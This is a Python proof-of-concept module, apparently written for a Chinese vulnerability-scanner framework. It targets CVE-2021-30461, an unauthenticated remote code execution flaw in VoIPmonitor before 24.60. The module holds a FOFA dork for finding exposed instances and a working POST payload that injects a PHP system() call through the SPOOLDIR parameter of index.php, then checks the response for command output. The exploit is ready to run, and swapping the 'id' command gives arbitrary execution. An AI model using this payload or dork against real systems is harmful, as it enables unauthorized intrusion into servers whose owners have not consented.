# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "VoIPmonitor 未授权远程代码执行(CVE-2021-30461)",                        # 漏洞名称
        "VulnID" : "CVE-2021-30461",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "VoIPmonitor",                     # 漏洞应用名称
        "AppVersion" : "VoIPmonitor < 24.60",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            VoIPmonitor 是开源网络数据包嗅探器，具有商业前端，用于在 linux 上运行的 SIP RTP RTCP SKINNY(SCCP) MGCP WebRTC VoIP 协议。
            VoIPmonitor的index.php文件中接受未授权用户提交的未经验证的参数值并将之写进了配置文件中，该配置文件在index.php代码下文中被require_once函数包含，从而导致任意代码执行
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="VoIPmonitor"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/index.php" # url自己按需调整

        data = """SPOOLDIR=test".system("id")."&recheck=annen"""

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)

            if "uid=" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()